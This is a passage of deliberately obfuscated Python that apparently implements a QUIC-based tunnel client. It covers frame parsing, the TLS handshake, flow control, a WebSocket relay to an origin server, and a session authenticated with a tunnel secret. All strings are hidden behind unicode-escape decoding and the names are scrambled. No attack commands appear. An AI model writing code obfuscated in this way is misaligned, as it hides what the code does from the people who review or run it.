            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0072\\u0065\\u0073\\u0065\\u0074\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1433, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                for O0_var_1427 in range(2):
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1423 += O0_var_1428[1]
                O0_var_1438 = self.streams.get(O0_var_1433)
                if O0_var_1438 is not None:
                    O0_var_1438.reset = True
                    self.on_stream_end(O0_var_1438)
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0073\\u0074\\u006f\\u0070\\u005f\\u0073\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')]:
                for O0_var_1427 in range(2):
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1423 += O0_var_1428[1]
                continue
            if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u006e\\u0065\\u0077\\u005f\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape')]:
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1430, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                self.peer_token = bytes(O0_var_1421[O0_var_1423:O0_var_1423 + O0_var_1430])
                O0_var_1423 += O0_var_1430
                continue
            if O0_var_1424 in (QUIC_FRAME[codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')], QUIC_FRAME[codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')]):
                O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                O0_var_1441, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')]:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1423 += O0_var_1428[1]
                O0_var_1442 = O0_var_1421[O0_var_1423:].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')) if O0_var_1423 < len(O0_var_1421) else codecs.decode('', 'unicode_escape')
                self._fail(codecs.decode('\\u0070\\u0065\\u0065\\u0072\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u0020\\u0063\\u006f\\u0064\\u0065\\u003d\\u0025\\u0064\\u0020\\u0072\\u0065\\u0061\\u0073\\u006f\\u006e\\u003d\\u0025\\u0073', 'unicode_escape') % (O0_var_1441, O0_var_1442))
                return
            if O0_var_1424 in (QUIC_FRAME[codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d', 'unicode_escape')], QUIC_FRAME[codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d\\u005f\\u006c\\u0065\\u006e', 'unicode_escape')]):
                O0_var_1430 = len(O0_var_1421) - O0_var_1423
                if O0_var_1424 == QUIC_FRAME[codecs.decode('\\u0064\\u0061\\u0074\\u0061\\u0067\\u0072\\u0061\\u006d\\u005f\\u006c\\u0065\\u006e', 'unicode_escape')]:
                    O0_var_1428 = O0_fn_33(O0_var_1421, O0_var_1423)
                    O0_var_1430, O0_var_1423 = (O0_var_1428[0], O0_var_1423 + O0_var_1428[1])
                if len(O0_var_1421) - O0_var_1423 < O0_var_1430:
                    return
                O0_var_1423 += O0_var_1430
                continue
            self._fail(codecs.decode('\\u0075\\u006e\\u0068\\u0061\\u006e\\u0064\\u006c\\u0065\\u0064\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0074\\u0079\\u0070\\u0065\\u0020\\u0025\\u0023\\u0078', 'unicode_escape') % O0_var_1424)
            return

    def _reader_number(self, O0_var_1443):
        O0_var_1444 = O0_fn_33(O0_var_1443[codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape')], O0_var_1443[codecs.decode('\\u0070\\u006f\\u0073', 'unicode_escape')])
        if O0_var_1444 is None:
            raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u0076\\u0061\\u0072\\u0069\\u006e\\u0074', 'unicode_escape'))
        O0_var_1443[codecs.decode('\\u0070\\u006f\\u0073', 'unicode_escape')] += O0_var_1444[1]
        return O0_var_1444[0]

    def _queue_one_off_frame(self, O0_var_1445, O0_var_1446):
        self.ack_pending[O0_var_1446] = True
        self.pending_one_off.append({codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape'): O0_var_1446, codecs.decode('\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1445})

    def _deliver_stream(self, O0_var_1447, O0_var_1448, O0_var_1449, O0_var_1450):
        O0_var_1451 = self.streams.get(O0_var_1447)
        if O0_var_1451 is None:
            O0_var_1451 = QuicStream(self, O0_var_1447, codecs.decode('\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065', 'unicode_escape') if O0_var_1447 & 1 else codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'))
            self.streams[O0_var_1447] = O0_var_1451
            self.on_stream(O0_var_1451)
        O0_var_1452 = O0_var_1451.receiver.accept(O0_var_1448, O0_var_1449)
        if O0_var_1452:
            O0_var_1451.recv += O0_var_1452
            self.consumed_total += len(O0_var_1452)
            if self.local_max_data - self.consumed_total < self.receive_window / 2:
                self.local_max_data = self.consumed_total + self.receive_window
                self.credit_max_data = True
            if O0_var_1451.local_limit - len(O0_var_1451.recv) < self.receive_window / 2:
                O0_var_1451.local_limit = len(O0_var_1451.recv) + self.receive_window
                if O0_var_1451 not in self.credit_ready:
                    self.credit_ready.append(O0_var_1451)
            self.on_stream_data(O0_var_1451, O0_var_1452)
            self._tick()
        if O0_var_1450 and (not O0_var_1451.ended) and (O0_var_1451.receiver.contiguous == len(O0_var_1451.recv)):
            O0_var_1451.ended = True
            self.on_stream_end(O0_var_1451)

    def _consume_tls(self, O0_var_1453, O0_var_1454):
        if O0_var_1453 == QUIC_EPOCH_APPLICATION:
            return
        if O0_var_1453 == QUIC_EPOCH_INITIAL and self.tls.state == codecs.decode('\\u0061\\u0077\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u002d\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u002d\\u0068\\u0065\\u006c\\u006c\\u006f', 'unicode_escape'):
            self.server_hello += O0_var_1454
            try:
                O0_var_1455 = self.tls.server_hello_complete(self.server_hello)
                if O0_var_1455 is None:
                    return
                self.server_hello = b''
                O0_var_1456 = self.tls.handle_server_hello(O0_var_1455)
            except Exception as exc:
                self._fail(codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u0020\\u0068\\u0065\\u006c\\u006c\\u006f\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc)
                return
            self.keys[QUIC_EPOCH_HANDSHAKE] = O0_var_1456
            self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u0020\\u0068\\u0065\\u006c\\u006c\\u006f\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064\\u002c\\u0020\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u006b\\u0065\\u0079\\u0073\\u0020\\u0069\\u006e\\u0073\\u0074\\u0061\\u006c\\u006c\\u0065\\u0064', 'unicode_escape'))
            return
        self.handshake_bytes += O0_var_1454
        self._pump_handshake_messages()

    def _pump_handshake_messages(self):
        while len(self.handshake_bytes) >= 4:
            O0_var_1457 = 4 + int.from_bytes(self.handshake_bytes[1:4], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            if len(self.handshake_bytes) < O0_var_1457:
                return
            O0_var_1458 = self.handshake_bytes[:O0_var_1457]
            self.handshake_bytes = self.handshake_bytes[O0_var_1457:]
            try:
                O0_var_1459 = self.tls.handle_handshake_message(O0_var_1458)
            except Exception as exc:
                self._fail(codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc)
                return
            if self.tls.remote_parameters is not None and self.remote_parameters is None:
                self.remote_parameters = self.tls.remote_parameters
                O0_var_1460 = self.remote_parameters
                self.peer_max_data = O0_var_1460.get(QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')], 0)
                self.peer_stream_remote = O0_var_1460.get(QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065', 'unicode_escape')], 0)
                self.peer_stream_local = O0_var_1460.get(QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')], 0)
                self.peer_max_ack_delay = min(O0_var_1460.get(QUIC_PARAM[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')], 25), 100)
            if O0_var_1459 is not None:
                if self.verify_certificate:
                    O0_var_1461 = O0_fn_38(self.tls.leaf_cert)
                    if O0_var_1461:
                        self._fail(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + O0_var_1461)
                        return
                self.keys[QUIC_EPOCH_APPLICATION] = {codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape'): O0_var_1459[codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape')], codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape'): O0_var_1459[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')]}
                self.app_recv_gens = [{codecs.decode('\\u006b\\u0065\\u0079\\u0073', 'unicode_escape'): O0_var_1459[codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape')], codecs.decode('\\u0070\\u0068\\u0061\\u0073\\u0065', 'unicode_escape'): 0}]
                self.app_send_keys[0] = O0_var_1459[codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape')]
                self.crypto_send[QUIC_EPOCH_HANDSHAKE].append(O0_var_1459[codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')], False)
                self.handshake_complete = True
                if not O0_var_1459[codecs.decode('\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape')]:
                    self.log.warning(codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u0020\\u0046\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0079\\u005f\\u0064\\u0061\\u0074\\u0061\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'))
                self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0020\\u0061\\u006c\\u0070\\u006e\\u003d\\u0025\\u0073', 'unicode_escape'), self.tls.negotiated_alpn or codecs.decode('\\u003f', 'unicode_escape'))
                if self.handshake_event is not None:
                    self.handshake_event.set()
                self.on_ready()
                return

    def _fail(self, message):
        if self.closed:
            return
        self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), message)
        self._finish(OSError(message))

    def _finish(self, O0_var_1462):
        if self.closed:
            return
        self.closed = str(O0_var_1462) if O0_var_1462 else codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape')
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        if not self.handshake_complete and self.handshake_event is not None:
            self.handshake_event.set()
        else:
            self.on_close(O0_var_1462)

def O0_fn_39(headers, name):
    return [O0_var_1464 for O0_var_1463, O0_var_1464 in headers if O0_var_1463.lower() == name]

def O0_fn_40(connect):
    O0_var_1465 = {}
    O0_var_1466 = []
    for O0_var_1467, O0_var_1468 in connect[codecs.decode('\\u006d\\u0065\\u0074\\u0061\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]:
        if QUIC_META_HEADER in O0_var_1467:
            O0_var_1469 = O0_var_1467.split(codecs.decode('\\u003a', 'unicode_escape'))
            if len(O0_var_1469) != 2:
                raise ValueError(codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0020\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073\\u0020\\u006d\\u0061\\u006c\\u0066\\u006f\\u0072\\u006d\\u0065\\u0064', 'unicode_escape') % O0_var_1467)
            O0_var_1466.append((O0_var_1469[1], O0_var_1468))
        else:
            O0_var_1465[O0_var_1467] = O0_var_1468
    O0_var_1470 = connect[codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape')]
    try:
        O0_var_1471 = urlsplit(connect[codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape')])
        O0_var_1470 = O0_var_1471.path + (codecs.decode('\\u003f', 'unicode_escape') + O0_var_1471.query if O0_var_1471.query else codecs.decode('', 'unicode_escape'))
    except ValueError:
        O0_var_1470 = connect[codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape')]
    O0_var_1472 = O0_fn_39(O0_var_1466, codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'))
    O0_var_1473 = codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape') in codecs.decode('\\u002c', 'unicode_escape').join(O0_fn_39(O0_var_1466, codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))).lower()
    O0_var_1474 = int(O0_var_1472[0]) if O0_var_1472 and O0_var_1472[0].isdigit() else None
    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): connect[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')], codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'): O0_var_1465.get(QUIC_META_METHOD, codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'): O0_var_1465.get(QUIC_META_HOST, codecs.decode('', 'unicode_escape')), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_1470 if O0_var_1470.startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + O0_var_1470, codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): O0_var_1466, codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u005f\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1474, codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u006c\\u0065\\u0073\\u0073', 'unicode_escape'): not O0_var_1473 and O0_var_1474 is None}

def O0_fn_41(O0_var_1475):
    request = O0_var_1475[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')]
    if request[codecs.decode('\\u0062\\u006f\\u0064\\u0079\\u006c\\u0065\\u0073\\u0073', 'unicode_escape')]:
        return True
    if O0_var_1475[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')]:
        return True
    return request[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u005f\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] is not None and len(O0_var_1475[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]) >= request[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u005f\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]

class QuicWebsocketRelay:

    def __init__(self, O0_var_1476, O0_var_1477, request, O0_var_1478, O0_var_1479):
        self.session = O0_var_1476
        self.state = O0_var_1477
        self.request = request
        self.origin = O0_var_1478
        self.log = O0_var_1479
        self.incoming = queue.Queue()
        self.stopped = threading.Event()
        self.sock = None

    def feed(self, O0_var_1480):
        self.incoming.put(O0_var_1480)

    def stop(self):
        self.stopped.set()
        O0_var_1481 = self.sock
        if O0_var_1481 is not None:
            try:
                O0_var_1481.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                O0_var_1481.close()
            except OSError:
                pass

    def run(self):
        O0_var_1482 = None
        try:
            self.sock = O0_fn_26(self.origin)
            self.send_handshake()
            response = http.client.HTTPResponse(self.sock, method=codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'))
            response.begin()
            if response.status != 101:
                self.session.write_response(self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')], codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u003a\\u0020\\u0025\\u0064', 'unicode_escape') % response.status, [(QUIC_META_STATUS, str(response.status))], True)
                try:
                    self.sock.close()
                except OSError:
                    pass
                return
            O0_var_1483 = [(QUIC_META_STATUS, str(response.status))]
            for O0_var_1484, O0_var_1485 in response.getheaders():
                O0_var_1486 = O0_var_1484.lower()
                if O0_var_1486 in (codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')):
                    continue
                if O0_var_1486.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_1486.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_1486.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')):
                    continue
                O0_var_1483.append((QUIC_META_HEADER + codecs.decode('\\u003a', 'unicode_escape') + O0_var_1484, O0_var_1485))
            self.session.write_response(self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')], codecs.decode('', 'unicode_escape'), O0_var_1483, False)
            O0_var_1482 = threading.Thread(target=self.write_to_origin, daemon=True)
            O0_var_1482.start()
            self.pump_origin()
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].id, exc)
            self.session.respond(self.state, str(exc), 502)
        finally:
            self.stop()
            if O0_var_1482 is not None:
                O0_var_1482.join(timeout=1)

    def pump_origin(self):
        if not self.stopped.is_set():
            try:
                O0_var_1487 = self.sock.recv(65536)
            except OSError:
                O0_var_1487 = b''
            if O0_var_1487 and (not self.stopped.is_set()):
                self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].write(O0_var_1487, False)
            while not self.stopped.is_set():
                try:
                    O0_var_1488 = self.sock.recv(65536)
                except OSError:
                    O0_var_1488 = b''
                if not O0_var_1488:
                    break
                self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].write(O0_var_1488, False)
            if not self.stopped.is_set():
                self.state[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].write(b'', True)

    def write_to_origin(self):
        while not self.stopped.is_set():
            try:
                O0_var_1489 = self.incoming.get(timeout=0.5)
            except queue.Empty:
                continue
            if O0_var_1489 is None:
                try:
                    self.sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                return
            try:
                self.sock.sendall(O0_var_1489)
            except OSError:
                self.stopped.set()
                return

    def send_handshake(self):
        O0_var_1490 = urlsplit(self.origin)
        O0_var_1491 = self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')] if self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')].startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')]
        O0_var_1492 = [codecs.decode('\\u0047\\u0045\\u0054\\u0020\\u0025\\u0073\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0031\\u002e\\u0031', 'unicode_escape') % O0_var_1491]
        O0_var_1493 = O0_var_1494 = O0_var_1495 = False
        for O0_var_1496, O0_var_1497 in self.request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
            O0_var_1498 = O0_var_1496.lower()
            if O0_var_1498 in (codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')):
                continue
            if O0_var_1498 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u006b\\u0065\\u0079', 'unicode_escape'):
                O0_var_1493 = True
            elif O0_var_1498 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'):
                O0_var_1494 = True
            elif O0_var_1498 == codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'):
                O0_var_1495 = True
            O0_var_1492.append(codecs.decode('\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_1496, O0_var_1497))
        O0_var_1492.append(codecs.decode('\\u0048\\u006f\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1490.netloc)
        if not O0_var_1495 and self.request.get(codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape')):
            O0_var_1492.append(codecs.decode('\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u003a\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0025\\u0073', 'unicode_escape') % self.request[codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape')])
        if not O0_var_1493:
            O0_var_1492.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % base64.b64encode(secrets.token_bytes(16)).decode())
        if not O0_var_1494:
            O0_var_1492.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u003a\\u0020\\u0031\\u0033', 'unicode_escape'))
        O0_var_1492.append(codecs.decode('\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'))
        O0_var_1492.append(codecs.decode('\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u003a\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'))
        self.sock.sendall((codecs.decode('\\u000d\\u000a', 'unicode_escape').join(O0_var_1492) + codecs.decode('\\u000d\\u000a\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u002d\\u0031', 'unicode_escape')))

class QuicSession:

    def __init__(self, O0_var_1499, O0_var_1500, O0_var_1501, O0_var_1502, O0_var_1503, O0_var_1504, O0_var_1505):
        self.conn = O0_var_1499
        self.origin = O0_var_1500
        self.account_tag = O0_var_1501
        self.tunnel_secret = O0_var_1502
        self.tunnel_id = O0_var_1503
        self.conn_index = O0_var_1504
        self.log = O0_var_1505
        self.control = None
        self.requests = {}
        self.relays = set()
        self.stopped = False
        self._done = threading.Event()
        self._error = None
        O0_var_1499.on_stream = self.accept_stream
        O0_var_1499.on_stream_data = self.receive_stream
        O0_var_1499.on_stream_end = self.end_stream
        O0_var_1499.on_close = self.stop

    def run(self):
        O0_var_1506 = self.conn.open_stream()
        self.control = ControlStream(self.conn, O0_var_1506.id, self.log)
        self.control.start(self.account_tag, self.tunnel_secret, self.tunnel_id, self.conn_index)
        self._done.wait()
        if self._error is not None:
            raise self._error

    def run_async(self):
        threading.Thread(target=self.run, daemon=True, name=codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u002d\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')).start()

    def stop(self, O0_var_1507=None):
        if self.stopped:
            return
        self.stopped = True
        self.requests.clear()
        for O0_var_1508 in list(self.relays):
            O0_var_1508.stop()
        self.relays.clear()
        self._error = O0_var_1507
        self._done.set()

    def accept_stream(self, O0_var_1509):
        if O0_var_1509.id & 3 != 1:
            return
